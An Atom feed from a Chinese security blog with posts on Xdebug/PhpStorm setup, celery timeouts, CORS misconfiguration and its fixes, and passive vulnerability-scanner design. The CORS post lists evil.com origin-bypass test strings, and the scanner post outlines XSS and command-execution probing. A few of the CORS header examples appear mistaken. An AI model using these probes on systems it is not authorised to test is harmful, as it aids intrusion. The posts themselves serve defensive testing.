<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-10-28T23:42:16+08:00</updated><id>/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">xdebug+phpstorm+phpstudy本地调试踩坑</title><link href="/vuln/2019/10/10/xdebug-phpstorm-phpstudy/" rel="alternate" type="text/html" title="xdebug+phpstorm+phpstudy本地调试踩坑" /><published>2019-10-10T21:13:00+08:00</published><updated>2019-10-10T21:13:00+08:00</updated><id>/vuln/2019/10/10/xdebug-phpstorm-phpstudy</id><content type="html" xml:base="/vuln/2019/10/10/xdebug-phpstorm-phpstudy/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;这两天用idea审java比较顺手，顺便也迁移了下php调试环境，从vscode迁移到jetbrains家的phpstorm。以前习惯了纯搜索字符串，通过打印调试，没有动态hook变量看起来比较费劲。迁移过程中遇到一些坑，故此记录一下。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;phpstorm配置&quot;&gt;phpstorm配置&lt;/h3&gt;

&lt;p&gt;先贴下我自己的php.ini配置【XDebug部分】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[XDebug]
xdebug.profiler_output_dir=&quot;D:\phpstudy_pro\Extensions\tmp\xdebug&quot;
xdebug.trace_output_dir=&quot;D:\phpstudy_pro\Extensions\tmp\xdebug&quot;
zend_extension=&quot;D:\phpstudy_pro\Extensions\php\php_xdebug-2.2.5-5.6-vc11-nts-x86_64.dll&quot;
xdebug.remote_port = 9000
xdebug.remote_autostart= On
xdebug.remote_enable = On
xdebug.idekey = phpstorm-xdebug
xdebug.remote_handler = &quot;dbgp&quot;
xdebug.remote_host = &quot;127.0.0.1&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;前人踩坑总结&quot;&gt;前人踩坑总结&lt;/h3&gt;

&lt;p&gt;中间遇到一个坑，网上大部分配置操作都照做了。&lt;/p&gt;

&lt;p&gt;这里着重讲几个重要的配置，跟下面网上扒拉的图不大一致【由于没找到合适的图床，暂时只能引用网上的】：&lt;/p&gt;

&lt;p&gt;顶栏点击File-&amp;gt;Settings，搜索框输入debug，ideakey是我自己设置的&lt;strong&gt;phpstorm-xdebug&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.pianshen.com/images/875/e473bbd1c2ba3874beb5b2c1be586e3b.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下图是网图，我设置的是&lt;strong&gt;9000&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.pianshen.com/images/213/403b3aca2b50f4b3529c098af21b19f5.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为是本地映射调试，下面网图的Use path mappings不要勾选，但填不填域名关系不大，我自己填的&lt;strong&gt;127.0.0.1&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.pianshen.com/images/497/bcad8b94b1ec8f582f0d14a176a0f439.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;注意，最新版的phpstorm下面不是web application，而是&lt;strong&gt;web page&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://static.oschina.net/uploads/space/2014/1128/150910_uD44_174025.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;设置cli-interpreter&quot;&gt;设置CLI Interpreter&lt;/h3&gt;

&lt;p&gt;设置链路为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Settings-&amp;gt;Languages&amp;amp;Frameworks-&amp;gt;PHP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;设置为你引用的php.exe绝对路径即可，另外该页面的Include Path按默认的就好。&lt;/p&gt;

&lt;h3 id=&quot;文件映射map报错可以看变量无法跟踪文件&quot;&gt;文件映射map报错，可以看变量，无法跟踪文件&lt;/h3&gt;

&lt;p&gt;记得在调试variables的时候，映射本地路径的时候，会要求&lt;strong&gt;做文件夹路径映射&lt;/strong&gt;，否则会报错，提示map错误，无法定位跟踪需要调试的文件。&lt;/p&gt;

&lt;h3 id=&quot;phpstorm-interpreter无法拦截&quot;&gt;PHPStorm Interpreter无法拦截&lt;/h3&gt;

&lt;p&gt;另外，还有个大坑就是，在配置时遇到interpreter无法拦截：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PHPStorm报错：Cannot accept external Xdebug connection: Cannot evaluate expression'isset($_SERVER['PHP_IDE_CONFIG'])';
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我看了下网上的说法，PHPStorm这个报错，是因为对于xdebug，zend_extension和extension不能同时启用，否则拦截启用不了（vscode似乎不受影响，我测的时候是可以拦截的）。&lt;/p&gt;

&lt;p&gt;导致此问题的一个可能原因是：服务器端的php.ini中配置了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extension=/path/xdebug.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;应该只保留下面一个，而且zend_extension需要绝对路径，extension不需要（至少win下是如此）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zend_extension=/path/xdebug.dll
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;原文是xdebug.so，按理说win下应该改成xdebug.dll，网上答案全tm爬虫抄的。&lt;/p&gt;

&lt;p&gt;这里我受了误导，耽误了很长时间。因为我发现，鄙人在win下的php.ini针对xdebug，只配置了zend_extension，并没有如网上所述去设置extension。&lt;/p&gt;

&lt;p&gt;那么为什么还会出现这种情况呢？&lt;/p&gt;

&lt;p&gt;后来终于想明白了，最开始，我在phpstudy界面自己加载了扩展，当时就直接：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;网站-&amp;gt;管理-&amp;gt;PHP扩展-&amp;gt;勾选php_xdebug
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;但是这里的配置，我所使用的php版本的php.ini里是看不到的，也许是引用的全局配置，具体在哪儿我没搞明白。&lt;/p&gt;

&lt;p&gt;反正因为这个重复了，但是vscode没有影响，在PHPStorm就直接无法拦截了。&lt;/p&gt;

&lt;p&gt;当我&lt;strong&gt;取消勾选&lt;/strong&gt;这里的&lt;strong&gt;xdebug扩展（php_xdebug）&lt;/strong&gt;时，问题就解决了。&lt;/p&gt;

&lt;h4 id=&quot;xdebug下断点超时&quot;&gt;xdebug下断点超时&lt;/h4&gt;

&lt;p&gt;在调试的时候，看着看着variables突然就没了，回网页一看，结果发现页面超时500。
尝试修改php.ini的超时配置，并没有卵用：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;max_execution_time=600
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;然后尝试直接在Apache（或者其他webserver）里做配置，成功解决超时问题：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FcgidIOTimeout 3600
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;QA:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;明天试试在引用处下断点，因为多空间引用可能走不到那一点，超时问题咋解决?
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;参考资料&quot;&gt;参考资料&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.pianshen.com/article/7930277434/&quot;&gt;《waiting for incoming connetcion with ide key 17142 问题解决
》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://ju.outofmemory.cn/entry/331038&quot;&gt;《MAMP 与 PhpStorm 远程调试
》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.jb51.net/article/128545.htm&quot;&gt;《使用PHPStorm+XDebug搭建单步调试环境》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/yizhou35/article/details/17043925&quot;&gt;《PHP Warning: Xdebug MUST be loaded as a Zend extension in Unknown on line 0 解决办法》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/universee/article/details/74516250&quot;&gt;《PhpStorm和WAMP配置调试参数，问题描述Error. Interpreter is not specified or invalid. Press “Fix” to edit your pro》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yjken/p/6555438.html&quot;&gt;《phpstorm中配置真正的远程调试(xdebug)》&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">这两天用idea审java比较顺手，顺便也迁移了下php调试环境，从vscode迁移到jetbrains家的phpstorm。以前习惯了纯搜索字符串，通过打印调试，没有动态hook变量看起来比较费劲。迁移过程中遇到一些坑，故此记录一下。</summary></entry><entry><title type="html">celery超时机制小结</title><link href="/coding/2019/10/08/celery-timeout-tips/" rel="alternate" type="text/html" title="celery超时机制小结" /><published>2019-10-08T11:35:00+08:00</published><updated>2019-10-08T11:35:00+08:00</updated><id>/coding/2019/10/08/celery-timeout-tips</id><content type="html" xml:base="/coding/2019/10/08/celery-timeout-tips/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;以前在使用celery任务时，老是被其超时机制不奏效所困扰，没有一个比较完美的解决方案。前两天琢磨出新的方案，故此借机梳理下过往细节。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;自带超时机制&quot;&gt;自带超时机制&lt;/h3&gt;

&lt;p&gt;首先，celery是自带超时机制的，主要分两种：&lt;/p&gt;

&lt;h4 id=&quot;软超时soft_time_limit&quot;&gt;软超时（soft_time_limit）&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@celery.task(soft_time_limit=360)
def soft_time_out_try(args,url_array):
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在这种情况下，就算超时了，也是平滑过渡不会报错，推荐优先考虑。&lt;/p&gt;

&lt;p&gt;但是这种情况有个问题，在该机制下，如果函数中含有容易超时的第三方模块，是可能存在软超时以后，任务继续卡住的情况的。&lt;/p&gt;

&lt;p&gt;笔者在测试时使用的是celery v3，在升级v4后暂时没遇到这种情况。&lt;/p&gt;

&lt;h4 id=&quot;硬超时time_limit&quot;&gt;硬超时（time_limit）&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@celery.task(time_limit=40)
def hard_time_out_try(args,url_array):
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在此情况下，超时阻断效果很给力，基本不会出现卡住的情况下。&lt;/p&gt;

&lt;p&gt;但是这种模式会直接抛出异常，不是特别友好。&lt;/p&gt;

&lt;p&gt;另外，在chord和group之类等聚合链路模式下，如果单个链路超时，会直接导致整体聚合失败，不会得到最终结果，也调用不了callback，比如下面的&lt;strong&gt;chord_return_value&lt;/strong&gt;函数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;results = chord( (hard_time_out_try_single.s(path, PASSWORD_DIC, host, port) for port in service_ports for path in plugin_www_paths ), chord_return_value.s(sys._getframe().f_code.co_name , url) )().get()

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;自定义超时机制&quot;&gt;自定义超时机制&lt;/h3&gt;

&lt;p&gt;如果celery自带的超时机制不能满足需求，我们可以尝试去构造监控，采用双保险避免模块超时。&lt;/p&gt;

&lt;h4 id=&quot;双保险之软超时优先&quot;&gt;双保险之软超时优先&lt;/h4&gt;

&lt;p&gt;先采用&lt;strong&gt;time_limit&lt;/strong&gt;进行最有效的阻断，再采用&lt;strong&gt;soft_time_limit&lt;/strong&gt;去处理抛出的错误。&lt;/p&gt;

&lt;p&gt;这样的话，&lt;strong&gt;优点&lt;/strong&gt;在于可以比较平滑的过度，适用于chord之类的聚合不会报错，&lt;strong&gt;缺点&lt;/strong&gt;在于会平白增加许多额外的task，会消耗更多人力和机器资源。&lt;/p&gt;

&lt;p&gt;具体案例如下（celery v3有时还是会出问题，celery v4未尝试）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@celery.task(soft_time_limit=120)
def hard_time_out_try_pre(path, PASSWORD_DIC, host, port):
    try:
        result= hard_time_out_try_single.apply_async( args=(path, PASSWORD_DIC, host, port) )
        while True:
            if result.ready() or result.status == &quot;Failed&quot;:
                break
        r = result.get()
        return r

    except Exception,e:
        print e
        
@celery.task(time_limit=100)
def soft_time_out_try(args,url_array):
    pass

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;双保险之硬超时优先&quot;&gt;双保险之硬超时优先&lt;/h4&gt;

&lt;p&gt;跟前面不同，这里优点在于比较保险地杀死超时函数，没有一开始就直接武断的使用time_limit，而带有一定的缓冲效果。&lt;/p&gt;

&lt;p&gt;当然，这里是不太适用于chord之类需要结果聚合的场景。&lt;/p&gt;

&lt;p&gt;简单解释下，TimeLimitExceeded会直接杀掉进程，raise一个TimeLimitExceeded，不能被 task捕捉，所以应该两种方案配合使用，&lt;strong&gt;soft_time_limit&lt;/strong&gt;=小int，&lt;strong&gt;time_limit&lt;/strong&gt;=大int，使用soft试图关闭进程超时就会被干掉。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from celery.exceptions import SoftTimeLimitExceeded

@celery.task
def mytask():
    try:
        return time_out_try_single()
    except SoftTimeLimitExceeded:
        cleanup_in_a_hurry()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;使用信号处理遏制函数超时&quot;&gt;使用信号处理，遏制函数超时&lt;/h4&gt;

&lt;p&gt;具体流程如下，尝试了对遏制函数超时比较有效，暂时没发现副作用。&lt;/p&gt;

&lt;p&gt;但这里没能再次复现第三方模块超时的场景，后续如若遇到相应情况不能解决，会继续更新其他解决方案，具体流程如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;调用&lt;strong&gt;time_out_try_single&lt;/strong&gt;函数进行超时监控，使用sleep模拟函数执行超时&lt;/li&gt;
  &lt;li&gt;引入signal模块，设置handler捕获超时信息，返回断言错误&lt;/li&gt;
  &lt;li&gt;alarm(120)，设置120秒闹钟，函数调用超时120秒则直接返回&lt;/li&gt;
  &lt;li&gt;捕获异常，打印超时信息。&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import time
import signal

def time_out_try_single(i):
    time.sleep(i%4)
    print &quot;%d within time&quot;%(i)
    return i

if __name__ == '__main__':
    def handler(signum, frame):
        raise AssertionError

    i = 0
    for i in range(1,10):
        try:
            signal.signal(signal.SIGALRM, handler)
            signal.alarm(120)
            time_out_try_single(i)
            i = i + 1
            signal.alarm(0)
        except AssertionError:
            print &quot;%d timeout&quot;%(i)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;参考文档&quot;&gt;参考文档&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://docs.celeryproject.org/en/latest/userguide/configuration.html#std:setting-task_time_limit&quot;&gt;《setting-task_time_limit》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/5a969b067ce6&quot;&gt;《hard杀死soft》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://blog.sina.com.cn/s/blog_63041bb80102uy5o.html&quot;&gt;《Python设置函数调用超时》&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="coding" /><summary type="html">以前在使用celery任务时，老是被其超时机制不奏效所困扰，没有一个比较完美的解决方案。前两天琢磨出新的方案，故此借机梳理下过往细节。</summary></entry><entry><title type="html">cors漏洞之123</title><link href="/vuln/2019/09/28/cors-tips/" rel="alternate" type="text/html" title="cors漏洞之123" /><published>2019-09-28T21:13:00+08:00</published><updated>2019-09-28T21:13:00+08:00</updated><id>/vuln/2019/09/28/cors-tips</id><content type="html" xml:base="/vuln/2019/09/28/cors-tips/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;cors漏洞要素&quot;&gt;cors漏洞要素&lt;/h3&gt;

&lt;p&gt;cors漏洞成功主要需要两个点，&lt;/p&gt;

&lt;p&gt;在Html Response头部里面：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: http://www.whitedomain.com
Access-Control-Allow-Origin: true or false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;或者同时具备：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Credentials这里是比较容易被忽略的，Credentials为false的话，数据包是不会带上&lt;strong&gt;传统的认证信息&lt;/strong&gt;，你获取到的敏感内容也是相对有限的。&lt;/p&gt;

&lt;p&gt;另外，cors漏洞也需要注意一点，你在构造测试点的时候，需要得到：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Origin: http://www.whitedomain.com
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的域名是不能带上目录的，因为你实际上构造钓鱼页面的时候，是无法构造畸形Origin的。&lt;/p&gt;

&lt;p&gt;为啥呢，因为你从页面发送给后端的请求，浏览器会主动去解析过滤，如果在这里去构造畸形的域名，他会只取到host部分，不会处理目录，然后拿去给后端解析。&lt;/p&gt;

&lt;p&gt;比如说，浏览器会像下面这样处理去取host，由于需要配合通用后端过滤设置，需要www.whitedomain.com结尾的绕过尝试：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.evil.com/whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com\.whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com#www.whitedomain.com ===&amp;gt; 
www.evil.com
http://www.evil.com?www.whitedomain.com ===&amp;gt; 
www.evil.com 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;大概举几个例子就行，反正我这边暂时没找到可以绕过的尝试，后缀whitedomain.com，搞出来基本上取出来的真正host，也只能是whitedomain.com。&lt;/p&gt;

&lt;p&gt;这是啥意思呢？意思是你去构造畸形的域名，浏览器可能就直接过滤拦截了。
传到后端的，基本就是你想要构造的恶意目的域名。这时候，后端做好相应的防跨域配置和服务器配置，基本就可以稳定拦截了。&lt;/p&gt;

&lt;h3 id=&quot;修复方法&quot;&gt;修复方法&lt;/h3&gt;

&lt;p&gt;java后端配置举例（jetty版本）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public FilterRegistrationBean crossFilter()
{
FilterRegistrationBean registration = new FilterRegistrationBean();
registration.setFilter(new org.eclipse.jetty.servlets.CrossOriginFilter() );
registration.addInitParameter(name: &quot;allowOrigins&quot;, value: &quot;*.whitedomain.com&quot;);
registration.addInitParameter(name: &quot;allowMethods&quot;, value: &quot;GET,POST,HEAD&quot;);
registration.addInitParameter(name: &quot;allowHeaders&quot;, value: &quot;X-Requested-With,Content-Type,Accept,Origin&quot;);
registration.addUrlPatterns(&quot;/*&quot;);
registration.setName(&quot;cross-origin&quot;);
return registration;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;需要在pom.xml里配置的话:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;web-app&amp;gt;

    &amp;lt;filter&amp;gt;
        &amp;lt;filter-name&amp;gt;cross-origin&amp;lt;/filter-name&amp;gt;
        &amp;lt;filter-class&amp;gt;org.eclipse.jetty.servlets.CrossOriginFilter&amp;lt;/filter-class&amp;gt;
    &amp;lt;/filter&amp;gt;
    &amp;lt;filter-mapping&amp;gt;
        &amp;lt;filter-name&amp;gt;cross-origin&amp;lt;/filter-name&amp;gt;
        &amp;lt;url-pattern&amp;gt;/*&amp;lt;/url-pattern&amp;gt;
    &amp;lt;/filter-mapping&amp;gt;

&amp;lt;/web-app&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;当然，如果遇到特殊情况，需要在前端直接配置，nodejs配置举例：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 判断origin是否在域名白名单列表中

function isOriginAllowed(origin, allowedOrigin) {

if (_.isArray(allowedOrigin)) {

for(let i = 0; i &amp;lt; allowedOrigin.length; i++) {

if(isOriginAllowed(origin, allowedOrigin[i])) {

return true;

}

}

return false;

} else if (_.isString(allowedOrigin)) {

return origin === allowedOrigin;

} else if (allowedOrigin instanceof RegExp) {

return allowedOrigin.test(origin);

} else {

return !!allowedOrigin;

}

}

const ALLOW_ORIGIN = [ // 域名白名单

'*.whitedomain.com',

];

app.post('/formdata', function (req, res, next) {

let reqOrigin = req.headers.origin; // request响应头的origin属性

// 判断请求是否在域名白名单内

if(isOriginAllowed(reqOrigin, ALLOW_ORIGIN)) {

// 设置CORS为请求的Origin值

res.header(&quot;Access-Control-Allow-Origin&quot;, reqOrigin);

//个人觉得下面一句根据业务而定，可设定可不设定。
res.header('Access-Control-Allow-Credentials', 'true');

// 你的业务代码逻辑代码 ...

// ...

} else {

res.send({ code: -2, msg: '非法请求' });

}

});
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。</summary></entry><entry><title type="html">浅谈被动漏扫思路</title><link href="/scanner/2019/08/15/axe-scanner-design/" rel="alternate" type="text/html" title="浅谈被动漏扫思路" /><published>2019-08-15T21:13:00+08:00</published><updated>2019-08-15T21:13:00+08:00</updated><id>/scanner/2019/08/15/axe-scanner-design</id><content type="html" xml:base="/scanner/2019/08/15/axe-scanner-design/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;sql注入&quot;&gt;SQL注入&lt;/h3&gt;
&lt;p&gt;对于SQLI注入，可以使用sqlmapapi进行检测。&lt;/p&gt;

&lt;p&gt;优点在于，对于一些带回显和延时注入，企业内部检测没有waf拦截，会较为准确的定位。&lt;/p&gt;

&lt;p&gt;缺点在于，对于这类检测，由于属于大规模扫描，一般会采用level和risk为初级的检测。当注入所需条件比较苛刻时，可能会覆盖不全，造成遗漏。&lt;/p&gt;

&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;
&lt;p&gt;对于XSS的检测的话，已经解决的有两个点，是针对反射性XSS和DOM型XSS的检测。&lt;/p&gt;

&lt;p&gt;以前对awvs一类的扫描器做过调研，通常是用变形的常用的payload去fuzz，检测效率是比较低的，也容易被拦截。&lt;/p&gt;

&lt;p&gt;针对反射性XSS（包含POST型存储XSS），采用的是检测部分特殊字符，两两成对，如果未曾过滤再去借助专门的XSS扫描器进行扫描，可尝试的字符如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'
&quot;
&amp;lt; 
&amp;gt; 
/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其实还可以做二次复检，加入敏感html标签再次尝试。这样检测成本提高不多，但会更准确一些。&lt;/p&gt;

&lt;p&gt;对于DOM型XSS检测，提供有两种方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;采用守护进程的方式去利用headless浏览器来hook渲染，从而检测出漏洞。
不过这种耗时比较长，有时候也因为浏览器渲染失败，以及同时发包量过大，导致内存崩溃漏掉部分漏洞。&lt;/li&gt;
  &lt;li&gt;采用类phamtomjs的引擎，直接增改数据包参数，像检测反射性XSS那样加入特殊字符，通过Ajax方式发送数据包，挨个去检测对比返回值。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;针对存储型XSS，主要存在一个痛点，返回的页面不一定是输出XSS的点，那我们应该怎么办呢？&lt;/p&gt;

&lt;p&gt;个人有个想法，我们可以通过数据库临时表记录下每个打了暗桩的post数据包，通过md5生成的是随机的值，我们可以采用这两种写法：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A = payload+定位符+md5
B = 特殊字符+定位符+md5
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后在抓到的后续访问数据包中，如果response含有完整的A或者B，我们可以通过标记去寻找回溯存储型XSS的源头。&lt;/p&gt;

&lt;p&gt;但有人可能会说了，你这随意下暗桩，搞得满站都是垃圾数据怎么办？&lt;/p&gt;

&lt;p&gt;以前笔者就遇到过几次众测，个别人坏了规矩，登录后拿着扫描器一顿扫，搞得每个页面都在弹窗。&lt;/p&gt;

&lt;p&gt;当然这个问题sqlmap等工具也是存在的，但这跟工具本身没关系，是设计和用途的问题。&lt;/p&gt;

&lt;p&gt;这就需要业务扫描平台去做去重规则和黑名单限制了。&lt;/p&gt;

&lt;h3 id=&quot;越权漏洞&quot;&gt;越权漏洞&lt;/h3&gt;

&lt;p&gt;越权漏洞本身是不太好全自动化检测的，但我们可以做一些半自动化的工作，比如：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置多组关键参数对，交替去替换原request中的参数对，看是否会有关键的差异response返回。&lt;/li&gt;
  &lt;li&gt;采用混淆过的或者置空的cookie，看看返回数据是否与原response相同。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;敏感文件泄露&quot;&gt;敏感文件泄露&lt;/h3&gt;

&lt;p&gt;在web目录可能会存在敏感配置文件或者临时文件，我们需要去通过黑盒探测，做好防治工作。&lt;/p&gt;

&lt;p&gt;我们可以采用关键词命中、状态码命中、header命中等方式，多维度进行判断和探测，正确率会相对较高。&lt;/p&gt;

&lt;p&gt;目前已经有部分开源扫描器采用了这种方式，可以直接调用或者模拟使用它们的规则。&lt;/p&gt;

&lt;h3 id=&quot;命令执行漏洞&quot;&gt;命令执行漏洞&lt;/h3&gt;

&lt;p&gt;命令执行的判定主要是通过以下几种方式：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;通过回显，直接判断有没有读取到文件。&lt;/li&gt;
  &lt;li&gt;通过dns服务器，判断有无读取到漏洞主机的请求。&lt;/li&gt;
  &lt;li&gt;通过server反馈时差，判断是否执行了sleep。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;但是一般命令执行会有一定的过滤和其他限制，我们需要通过拼接和替换参数值的方式，去构造执行命令的语句，这时候我们就需要用payload去fuzz了。&lt;/p&gt;

&lt;h3 id=&quot;敏感信息泄露&quot;&gt;敏感信息泄露&lt;/h3&gt;

&lt;p&gt;对于敏感信息检测，可以通过关键词进行定位，方式主要有以下几种：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;配置信息&lt;/li&gt;
  &lt;li&gt;日志信息&lt;/li&gt;
  &lt;li&gt;敏感api和路径&lt;/li&gt;
  &lt;li&gt;cookie/token/明文密码/手机号等&lt;/li&gt;
&lt;/ul&gt;

